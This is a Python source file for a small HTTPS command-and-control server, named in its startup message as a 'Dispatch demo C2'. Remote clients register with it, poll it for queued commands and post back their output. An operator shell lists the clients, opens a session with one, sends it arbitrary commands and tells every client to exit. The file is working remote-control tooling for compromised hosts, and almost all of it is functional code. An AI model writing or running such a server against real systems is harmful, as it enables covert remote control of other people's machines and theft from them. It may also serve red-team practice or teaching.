import ssl
import sys
import json
import threading
import argparse
from cmd import Cmd
from time import sleep
from http.server import HTTPServer, BaseHTTPRequestHandler


clients = {}            # IP -> {"label": str, "status": str}
client_labels = {}      # label -> IP
commands = {}           # IP -> [command list]
label_counter = 1
server_running = True   # For exit handling

class SimpleHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        global label_counter

        client_ip = self.headers.get('X-Forwarded-For', self.client_address[0]).split(',')[0].strip()

        if self.path == "/register":
            self.rfile.read(int(self.headers['Content-Length']))  # discard payload

            # Assign label if new client
            if client_ip not in clients:
                label = f"client-{label_counter}"
                clients[client_ip] = {"label": label, "status": "registered"}
                client_labels[label] = client_ip
                commands[client_ip] = []
                label_counter += 1
                print(f"\n[+] New client registered: {label} ({client_ip})")

            self.send_response(200)
            self.end_headers()

        elif self.path == "/data":
            data = self.rfile.read(int(self.headers['Content-Length'])).decode()
            label = clients.get(client_ip, {}).get("label", client_ip)
            print(f"\n[+] Response from {label}:\n{data}")
            self.send_response(200)
            self.end_headers()

    def do_GET(self):
        client_ip = self.headers.get('X-Forwarded-For', self.client_address[0]).split(',')[0].strip()

        if self.path == "/data":
            cmd_list = commands.get(client_ip, [])
            output = cmd_list.pop(0) if cmd_list else ""
            self.send_response(200)
            self.end_headers()
            self.wfile.write(output.encode())

    def log_message(self, format, *args):
        return


class ServerShell(Cmd):
    prompt = "(server) > "

    def do_clients(self, arg):
        """List all connected clients"""
        if not clients:
            print("No clients registered.")
        else:
            for ip, info in clients.items():
                print(f"{info['label']} - {ip} - {info['status']}")

    def do_interact(self, label):
        """interact <client-label>"""
        if label not in client_labels:
            print(f"No such client: {label}")
            return
        client_ip = client_labels[label]
        print(f"[*] Entering session with {label}. Type 'bg' to return.\n")
        SessionShell(client_ip, label).cmdloop()

    def do_exit(self, arg):
        """Exit the server and tell all clients to exit"""
        print("[!] Sending exit command to all clients...")
        for ip in commands:
            commands[ip].append("exit")
        print("Exiting server.")
        sys.exit(0)


class SessionShell(Cmd):
    def __init__(self, client_ip, label):
        super().__init__()
        self.client_ip = client_ip
        self.label = label
        self.prompt = f"({label}) > "

    def default(self, line):
        """Send any command to the client"""
        commands[self.client_ip].append(line)

    def do_bg(self, arg):
        """Return to main server prompt"""
        print(f"[~] Returning to main menu.")
        return True


def start_server(host, port):
    httpd = HTTPServer((host, port), SimpleHandler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='certs/cert.pem', keyfile='certs/key.pem')
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    print(f"[+] HTTPS server running on {host}:{port}...\n")
    httpd.serve_forever()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Start HTTPS command server.")
    parser.add_argument('--host', default='0.0.0.0', help='Bind address (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=4443, help='Port to bind (default: 4443)')
    args = parser.parse_args()

    print(f"\n[+] Starting Dispatch demo C2")
    threading.Thread(target=start_server, args=(args.host, args.port), daemon=True).start()
    sleep(0.5)
    ServerShell().cmdloop()
